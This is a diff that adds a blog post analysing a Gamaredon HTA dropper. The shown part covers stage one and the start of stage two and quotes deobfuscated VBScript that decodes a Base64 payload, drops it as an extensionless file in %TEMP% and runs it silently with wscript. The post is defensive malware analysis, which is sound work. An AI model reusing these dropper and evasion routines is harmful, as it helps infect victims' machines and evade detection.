@@ -1,0 +1,491 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Gamaredon | Profzzor</title><meta name="author" content="Profzzor"><meta name="copyright" content="Profzzor"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Technical analysis of a **Gamaredon** HTA dropper. The malware executes a multi-stage infection chain (HTA -&gt;VBS -&gt; powerShell) that abuses legitimate tunneling services (Microsoft Dev Tunnels, Cloudf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Gamaredon">
+<meta property="og:url" content="http://profzzor.github.io/Gamaredon/index.html">
+<meta property="og:site_name" content="Profzzor">
+<meta property="og:description" content="Technical analysis of a **Gamaredon** HTA dropper. The malware executes a multi-stage infection chain (HTA -&gt;VBS -&gt; powerShell) that abuses legitimate tunneling services (Microsoft Dev Tunnels, Cloudf">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://profzzor.github.io/Gamaredon/cover.png">
+<meta property="article:published_time" content="2025-12-10T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-10T06:09:31.909Z">
+<meta property="article:author" content="Profzzor">
+<meta property="article:tag" content="Gamaredon">
+<meta property="article:tag" content="VBScript">
+<meta property="article:tag" content="infostealer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://profzzor.github.io/Gamaredon/cover.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Gamaredon",
+  "url": "http://profzzor.github.io/Gamaredon/",
+  "image": "http://profzzor.github.io/Gamaredon/cover.png",
+  "datePublished": "2025-12-10T00:00:00.000Z",
+  "dateModified": "2025-12-10T06:09:31.909Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Profzzor",
+      "url": "http://profzzor.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://profzzor.github.io/Gamaredon/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Gamaredon',
+  isHighlightShrink: undefined,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Profzzor</span></a><a class="nav-page-title" href="/"><span class="site-name">Gamaredon</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Gamaredon</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2025-12-10T00:00:00.000Z" title="Created 2025-12-10 00:00:00">2025-12-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Malware-Analysis/">Malware Analysis</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>21mins</span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="1-Executive-Summary"><a href="#1-Executive-Summary" class="headerlink" title="1. Executive Summary"></a>1. Executive Summary</h1><p>This report details the analysis of a multi-stage malicious HTML Application (HTA) identified as a dropper associated with <strong>Gamaredon</strong> (also known as Primitive Bear, Shuckworm, or Armageddon). The threat actor is a state-sponsored group primarily targeting Ukrainian government and military organizations, though their indiscriminate spreading techniques often affect broader targets.</p>
+<p>The infection chain commences with a heavily obfuscated HTA file that drops a VBScript downloader. Through a series of handoffs involving intermediate VBScript bridges, the attack culminates in the execution of a fileless PowerShell espionage module.</p>
+<p><strong>Key Findings:</strong></p>
+<ul>
+<li><strong>Sophisticated Evasion:</strong> The malware abuses legitimate internet services—including Cloudflare Workers, Microsoft Dev Tunnels, and Loophole—to tunnel Command and Control (C2) traffic. This technique renders standard IP&#x2F;Domain blocklists ineffective.</li>
+<li><strong>Resilient Infrastructure:</strong> The malware employs a “Loop of Death” connection strategy, rotating through hardcoded IPs, dynamic domains, and third-party lookups (via check-host.net) to resolve C2 addresses.</li>
+<li><strong>Espionage Capabilities:</strong> The final payload is designed for rapid reconnaissance. It captures screenshots (with active cursor position), enumerates files, maps network drives, and profiles installed security software.</li>
+<li><strong>Living-off-the-Land (LotL):</strong> The attack relies entirely on native Windows utilities (mshta.exe, wscript.exe, powershell.exe), leaving minimal forensic footprints on the disk.</li>
+</ul>
+<p>The analyzed sample represents a high-severity threat due to its ability to bypass perimeter firewalls and its focus on immediate data exfiltration.</p>
+<h1 id="2-Technical-Analysis"><a href="#2-Technical-Analysis" class="headerlink" title="2. Technical Analysis"></a>2. Technical Analysis</h1><h2 id="2-1-Stage-1-HTA-Dropper"><a href="#2-1-Stage-1-HTA-Dropper" class="headerlink" title="2.1 Stage 1: HTA Dropper"></a>2.1 Stage 1: HTA Dropper</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-FileHash</span> .\gamaredon.hta</span><br><span class="line"></span><br><span class="line">Algorithm       Hash                          </span><br><span class="line"><span class="literal">---------</span>       <span class="literal">----</span>                                                              </span><br><span class="line">SHA256          AA572532AB1C8A731E7BA32E97BA180268EEE8E6A74A2B9C4DC3EFB669EDB9AF</span><br></pre></td></tr></table></figure>
+
+<p>The file gamaredon.hta is an HTML Application containing a heavily obfuscated VBScript. The script employs string concatenation, variable randomization, and dead-code insertion (junk loops and arithmetic) to evade static analysis.</p>
+<p>After manual deobfuscation, the script was identified as a <strong>dropper</strong>. The execution flow consists of four distinct phases: Command Construction, Payload Decoding, File Dropping, and Execution.</p>
+<h3 id="File-Overview"><a href="#File-Overview" class="headerlink" title="File Overview"></a><strong>File Overview</strong></h3><ul>
+<li><strong>File Name:</strong> <code>gamaredon.hta</code></li>
+<li><strong>File Type:</strong> HTML Application (HTA) containing embedded VBScript</li>
+<li><strong>SHA-256:</strong> <code>AA572532AB1C8A731E7BA32E97BA180268EEE8E6A74A2B9C4DC3EFB669EDB9AF</code></li>
+<li><strong>Total Lines:</strong> ~1205</li>
+<li><strong>Purpose:</strong> Downloader &#x2F; Stage-1 loader used to fetch or reconstruct a <strong>second-stage VBScript payload</strong></li>
+</ul>
+<p><img src="/Gamaredon/image-1.png" alt="Figure 1 : Stage1 &#96;.hta&#96; File."></p>
+<h3 id="A-Entry-Point-and-Command-Construction"><a href="#A-Entry-Point-and-Command-Construction" class="headerlink" title="A. Entry Point and Command Construction"></a>A. Entry Point and Command Construction</h3><p>The entry point of the script is <code>pyramidlHU/func_main</code>. Its primary purpose is to reconstruct the execution command string character by character. This is done to prevent simple string matching (like YARA rules) from detecting the intent to launch wscript.exe.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> func_main</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span></span><br><span class="line"></span><br><span class="line">    var_wscript = var_wscript + <span class="string">&quot;ws&quot;</span></span><br><span class="line">    var_wscript = var_wscript + <span class="string">&quot;cri&quot;</span></span><br><span class="line">    var_wscript = var_wscript + <span class="string">&quot;pt&quot;</span></span><br><span class="line">    var_wscript = var_wscript + <span class="string">&quot;.&quot;</span></span><br><span class="line">    var_wscript = var_wscript + <span class="string">&quot;ex&quot;</span></span><br><span class="line">    var_wscript = var_wscript + <span class="string">&quot;e &quot;</span></span><br><span class="line"></span><br><span class="line">    var_wscript_argv = var_wscript_argv + <span class="string">&quot; //&quot;</span></span><br><span class="line">    var_wscript_argv = var_wscript_argv + <span class="string">&quot;e&quot;</span></span><br><span class="line">    var_wscript_argv = var_wscript_argv + <span class="string">&quot;:vb&quot;</span></span><br><span class="line">    var_wscript_argv = var_wscript_argv + <span class="string">&quot;scri&quot;</span></span><br><span class="line">    var_wscript_argv = var_wscript_argv + <span class="string">&quot;pt &quot;</span></span><br><span class="line">    var_wscript_argv = var_wscript_argv + <span class="string">&quot;//b &quot;</span></span><br><span class="line"></span><br><span class="line">    func_execute_stage2 var_wscript, <span class="string">&quot;&quot;&quot;&quot;</span> &amp; allegianceLBS &amp; <span class="string">&quot;&quot;&quot;&quot;</span> &amp; var_wscript_argv</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&quot;ws&quot; + &quot;cri&quot; + &quot;pt&quot; + &quot;.&quot; + &quot;ex&quot; + &quot;e &quot;</code><br>  → <strong><code>wscript.exe</code></strong></li>
+<li><code>//e:vbs</code> → force VBScript engine</li>
+<li><code>//b</code> → run in batch mode without prompts</li>
+</ul>
+<p>This argument is critical. It forces the interpreter to handle the target file as VBScript, regardless of the file extension.</p>
+<p>Once assembled, it calls <code>func_execute_stage2()</code> with:</p>
+<ul>
+<li>the string <code>&quot;wscript.exe&quot;</code></li>
+<li>the path to the dropped Stage-2 script (returned by <code>allegianceLBS()</code>)</li>
+</ul>
+<h3 id="B-Payload-Decoding"><a href="#B-Payload-Decoding" class="headerlink" title="B. Payload Decoding"></a>B. Payload Decoding</h3><p>The function <code>jobsN2A</code> contains the embedded payload in a Base64 string. It utilizes <code>Microsoft.XMLDOM</code> to decode the string into binary data. A secondary helper function, <code>fitsGXt</code>, uses <code>ADODB.Stream</code> to convert that binary data into a UTF-8 text string.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> jobsN2A()</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span></span><br><span class="line"></span><br><span class="line">    var_base63_encoded = <span class="string">&quot;ZGltIHNob3J0c2ZHRiwg----------snip-------------Ig0K&quot;</span></span><br><span class="line"></span><br><span class="line">    shuttersQI = <span class="string">&quot;msxml2.domdocument.3.0&quot;</span></span><br><span class="line">    needleworkBx3 = <span class="string">&quot;base64&quot;</span></span><br><span class="line"></span><br><span class="line">    noblesr9n = <span class="string">&quot;bin.base64&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">set</span> pigb38 = <span class="built_in">createobject</span>(shuttersQI).createelement(needleworkBx3)</span><br><span class="line">    pigb38.datatype = noblesr9n</span><br><span class="line">    pigb38.text = var_base63_encoded</span><br><span class="line"></span><br><span class="line">    jobsN2A = fitsGXt(pigb38.nodetypedvalue)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>A hard-coded Base64 string (<code>var_base63_encoded</code>) contains the malware’s second stage.</li>
+<li>It creates an MSXML Base64 element:<ul>
+<li><code>msxml2.domdocument.3.0</code></li>
+<li>Element type: <code>&quot;base64&quot;</code></li>
+</ul>
+</li>
+<li>Sets its datatype to <code>&quot;bin.base64&quot;</code> so MSXML automatically decodes it.</li>
+<li>Passes the decoded binary bytes to <code>fitsGXt()</code> for UTF-8 conversion.</li>
+</ol>
+<h3 id="C-Binary-to-Text-Converter"><a href="#C-Binary-to-Text-Converter" class="headerlink" title="C.  Binary-to-Text Converter"></a>C.  Binary-to-Text Converter</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> fitsGXt(blouseqeV)</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">set</span> leaderMsr = <span class="built_in">createobject</span>(<span class="string">&quot;adodb.stream&quot;</span>)</span><br><span class="line">    leaderMsr.type = <span class="number">1</span></span><br><span class="line">    leaderMsr.open</span><br><span class="line">    leaderMsr.write blouseqeV</span><br><span class="line"></span><br><span class="line">    leaderMsr.position = <span class="number">0</span></span><br><span class="line">    leaderMsr.type = <span class="number">2</span></span><br><span class="line">    leaderMsr.charset = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line"></span><br><span class="line">    fitsGXt = leaderMsr.readtext</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+
+<p>This function converts the raw Base64-decoded bytes into readable <strong>UTF-8 text</strong>, which is the final VBS payload.</p>
+<p>Workflow:</p>
+<ol>
+<li>Writes the binary data into an <code>ADODB.Stream</code> object.</li>
+<li>Switches the stream to <strong>text mode</strong>.</li>
+<li>Sets the charset to UTF-8.</li>
+<li>Outputs the decoded Stage-2 script as a string.</li>
+</ol>
+<p>This acts as the script’s <strong>decompression&#x2F;unpacking mechanism</strong>.</p>
+<h3 id="D-File-Dropper"><a href="#D-File-Dropper" class="headerlink" title="D. File Dropper"></a>D. File Dropper</h3><p>The function <code>allegianceLBS</code> handles writing the decoded payload to the disk.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> allegianceLBS()</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span></span><br><span class="line"></span><br><span class="line">    var_wscirpt_1 = <span class="string">&quot;WScript.Shell&quot;</span></span><br><span class="line">    var_temp_location = <span class="string">&quot;%TEMP%&quot;</span></span><br><span class="line"></span><br><span class="line">    scornlN6 = <span class="string">&quot;Scripting.FileSystemObject&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> var_create_object_1 = <span class="built_in">CreateObject</span>(var_wscirpt_1)</span><br><span class="line">    <span class="keyword">Set</span> embarrasspea = <span class="built_in">CreateObject</span>(scornlN6)</span><br><span class="line"></span><br><span class="line">    var_file_name = <span class="string">&quot;\ricebG3&quot;</span></span><br><span class="line">    var_file_loc = var_create_object_1.ExpandEnvironmentStrings(var_temp_location) &amp; var_file_name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> halfwayP4K = embarrasspea.CreateTextFile(var_file_loc, <span class="literal">true</span>)</span><br><span class="line">    halfwayP4K.Write jobsN2A</span><br><span class="line">    halfwayP4K.Close</span><br><span class="line"></span><br><span class="line">    allegianceLBS = var_file_loc</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Creates standard COM objects:<ul>
+<li><code>WScript.Shell</code></li>
+<li><code>Scripting.FileSystemObject</code></li>
+</ul>
+</li>
+<li>Resolves <code>%TEMP%</code> to a fully qualified path.</li>
+<li>Drops the Stage-2 script to:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%TEMP%\ricebG3</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Writes the output of <code>jobsN2A()</code> (the decoded VBS payload) into that file.</li>
+<li><strong>Extensionless File:</strong> The malware intentionally saves the file <strong>without a file extension</strong> (e.g., .vbs). This is a defensive evasion technique. Many security solutions scan specific extensions or look for executable headers. By saving it as a generic file and using <code>//e:vbscript</code> later, it bypasses basic filters.</li>
+</ul>
+<h3 id="E-Execution"><a href="#E-Execution" class="headerlink" title="E. Execution"></a>E. Execution</h3><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> func_execute_stage2(w_script, wscript_argv)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    shell_exe_app = <span class="string">&quot;Shell.Application&quot;</span></span><br><span class="line">    <span class="keyword">Set</span> create_object = <span class="built_in">CreateObject</span>(shell_exe_app)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; create_object.ShellExecute w_script, wscript_argv</span></span><br><span class="line">    Wscript.Echo w_script, wscript_argv</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+<p>This function is responsible for executing the dropped Stage-2 VBScript using <code>ShellExecute</code>.</p>
+<ul>
+<li>Creates the <code>Shell.Application</code> COM object.</li>
+<li>Intended behavior (commented in your sanitized sample):</li>
+</ul>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_object.ShellExecute <span class="string">&quot;wscript.exe&quot;</span>, <span class="string">&quot;&lt;TEMP&gt;\ricebG3 //e:vbs //b&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Would run Stage-2 silently, without dialog boxes.</li>
+</ul>
+<p>The ShellExecute method is triggered to run the constructed command. This transitions the infection chain from the HTA context (controlled by mshta.exe) to the WScript context. The process tree will show mshta.exe spawning wscript.exe.</p>
+<p>Cleaning and de-obfuscating this Stage-1 HTA took approximately one hour. After commenting out the <code>ShellExecute</code> call and running the script in a controlled environment, we were able to observe the exact command it intended to execute:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscript.exe  <span class="string">&quot;C:\Users\Profzzor\AppData\Local\Temp\ricebG3&quot;</span> //e:vbscript //b</span><br></pre></td></tr></table></figure>
+<p>confirming both the file it drops into the <code>%TEMP%</code> directory and the method used to launch the Stage-2 payload.</p>
+<h2 id="2-2-Stage-2-VBScript-Downloader-ricebG3"><a href="#2-2-Stage-2-VBScript-Downloader-ricebG3" class="headerlink" title="2.2 Stage 2: VBScript Downloader (ricebG3)"></a>2.2 Stage 2: VBScript Downloader (ricebG3)</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-FileHash</span> .\ricebG3</span><br><span class="line"></span><br><span class="line">Algorithm       Hash</span><br><span class="line"><span class="literal">---------</span>       <span class="literal">----</span> </span><br><span class="line">SHA256          <span class="number">46</span>D43BEB0BF73BF805C319F4D82B627907046A4C6F18AD1EE9B0B7A59CBE96B9</span><br></pre></td></tr></table></figure>
+
+<h3 id="File-Overview-1"><a href="#File-Overview-1" class="headerlink" title="File Overview"></a>File Overview</h3><ul>
+<li><strong>File Name:</strong> <code>ricebG3</code>  </li>
+<li><strong>File Type:</strong> Obfuscated VBScript (Stage-2 payload dropped by <code>gamaredon.hta</code>)  </li>
+<li><strong>SHA-256:</strong> <code>46D43BEB0BF73BF805C319F4D82B627907046A4C6F18AD1EE9B0B7A59CBE96B9</code>  </li>
+<li><strong>Total Lines:</strong> ~5022  </li>
+<li><strong>Purpose:</strong> Fully functional <strong>Stage-2 downloader&#x2F;backdoor</strong>, responsible for beaconing, fingerprinting the machine, rotating through multiple C2 infrastructures, downloading a Base64-encoded Stage-3 payload, decoding it, and executing it via <code>ExecuteGlobal</code>.</li>
+</ul>
+<p><img src="/Gamaredon/image-2.png" alt="Figure 2 : Stage2 Vbscript File"></p>
+<h3 id="A-Victim-Fingerprinting"><a href="#A-Victim-Fingerprinting" class="headerlink" title="A. Victim Fingerprinting"></a>A. Victim Fingerprinting</h3><p>Upon execution, the script immediately generates a unique identifier for the infected machine. This ID is composed of the Computer Name and the Volume Serial Number of the system drive. This allows the attackers to track individual infections and serve specific payloads to high-value targets.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> GenerateSystemFingerpr<span class="built_in">int</span>()</span><br><span class="line">    <span class="comment">&#x27; Retrieves System Drive (e.g., C:)</span></span><br><span class="line">    drive_path = <span class="built_in">createobject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).expandenvironmentstrings(<span class="string">&quot;%systemdrive%&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; Retrieves the Drive Serial Number</span></span><br><span class="line">    serial_num = <span class="built_in">createobject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>).getdrive(drive_path).serialnumber</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; Converts to Hex for the ID</span></span><br><span class="line">    GenerateSystemFingerprint = <span class="built_in">hex</span>(serial_num)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="B-C2-Communication-User-Agent-Construction"><a href="#B-C2-Communication-User-Agent-Construction" class="headerlink" title="B. C2 Communication &amp; User-Agent Construction"></a>B. C2 Communication &amp; User-Agent Construction</h3><p>The malware constructs a custom User-Agent string. This is a critical network indicator. It appends the Victim ID (generated in step A) directly into the User-Agent header, allowing the C2 server to identify the victim simply by looking at the HTTP headers.</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; Pattern: Mozilla/5.0... Firefox/77.0::/.[RandomString]/.[ComputerName]_[DriveSerialHex]::/./.</span></span><br><span class="line">BuildUserAgent = defaultUserAgentPrefix &amp; GetComputerName &amp; <span class="string">&quot;_&quot;</span> &amp; GenerateSystemFingerprint &amp; <span class="string">&quot;::/./.&quot;</span> &amp; ...</span><br></pre></td></tr></table></figure>
+<p>The script sends GET requests with specific headers:</p>
+<ul>
+<li>User-Agent: Contains the Victim ID.</li>
+<li>Cookie: Hardcoded to <code>missionaryZ0w</code>.</li>
+<li>Content-Length: Hardcoded to 2817 (even for GET requests, which is anomalous).</li>
+</ul>
+<h3 id="C-C2-Infrastructure-Redundancy"><a href="#C-C2-Infrastructure-Redundancy" class="headerlink" title="C. C2 Infrastructure &amp; Redundancy"></a>C. C2 Infrastructure &amp; Redundancy</h3><p>The script exhibits a highly resilient “Loop of Death” trying to reach a Command and Control server. It rotates through four different mechanisms to find a working C2. If one fails, it sleeps and tries the next.</p>
